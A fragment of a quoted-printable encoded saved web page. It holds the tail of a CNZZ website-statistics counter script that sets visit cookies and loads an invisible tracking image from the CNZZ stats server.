+if(cnzz_a!=3D-1) cnzz_a=3DparseInt(cnzz_a)+1;=0A=
+else cnzz_a=3D0;=0A=
+var rt=3DparseInt(gc_cnzz("rtime"));=0A=
+var lt=3DparseInt(gc_cnzz("ltime"));=0A=
+var cnzz_st =3D parseInt((cnzz_now-lt)/1000);=0A=
+var cnzz_sin =3D gc_cnzz("sin355990");=0A=
+if(cnzz_sin=3D=3D-1) cnzz_sin=3D'none';=0A=
+if( document.referrer.split('/')[2]!=3Ddocument.domain ) =
+cnzz_sin=3Ddocument.referrer;=0A=
+var cnzz_eid=3Dgc_cnzz("cnzz_eid");=0A=
+if(cnzz_eid=3D=3D-1) =
+cnzz_eid=3DMath.floor(Math.random()*100000000)+"-"+1271508042+"-"+documen=
+t.referrer.substr(0,64);=0A=
+if(lt<1000000){rt=3D0;lt=3D0;}=0A=
+if(rt<1) rt=3D0;=0A=
+if(((cnzz_now-lt)>500*86400)&&(lt>0)) rt++;=0A=
+cnzz_data=3Dcnzz_data+'&repeatip=3D'+cnzz_a+'&rtime=3D'+rt+'&cnzz_eid=3D'=
++escape(cnzz_eid)+'&showp=3D'+escape(screen.width+'x'+screen.height)+'&st=
+=3D'+cnzz_st+'&sin=3D'+escape(cnzz_sin.substr(0,512))+'&res=3D0';=0A=
+document.write('<a =
+href=3D"http://www.cnzz.com/stat/website.php?web_id=3D355990" =
+target=3D_blank =
+title=3D"&#31449;&#38271;&#32479;&#35745;">&#31449;&#38271;&#32479;&#3574=
+5;</a>');=0A=
+document.write('<img =
+src=3D"http://zs4.cnzz.com/stat.htm?id=3D355990'+cnzz_data+'" border=3D0 =
+width=3D0 height=3D0 />');=0A=
+=0A=
+var =
+cnzz_et=3D(86400-cnzz_ed.getHours()*3600-cnzz_ed.getMinutes()*60-cnzz_ed.=
+getSeconds());=0A=
+cnzz_ed.setTime(cnzz_now+1000*(cnzz_et-cnzz_ed.getTimezoneOffset()*60));=0A=
+document.cookie=3D"cnzz_a355990=3D"+cnzz_a+";expires=3D"+cnzz_ed.toGMTStr=
+ing()+ "; path=3D/";=0A=
+document.cookie=3D"sin355990=3D"+escape(cnzz_sin)+ =
+";expires=3D"+cnzz_ed.toGMTString()+";path=3D/";=0A=
+cnzz_ed.setTime(cnzz_now+1000*86400*182);=0A=
+document.cookie=3D"rtime=3D"+rt+";expires=3D"+cnzz_ed.toGMTString()+ =
+";path=3D/";=0A=
+document.cookie=3D"ltime=3D"+cnzz_now+";expires=3D" + =
+cnzz_ed.toGMTString()+ ";path=3D/";=0A=
+document.cookie=3D"cnzz_eid=3D"+escape(cnzz_eid)+ =
+";expires=3D"+cnzz_ed.toGMTString()+";path=3D/";=0A=
+
+------=_NextPart_000_0000_01CADE76.44EC8960--
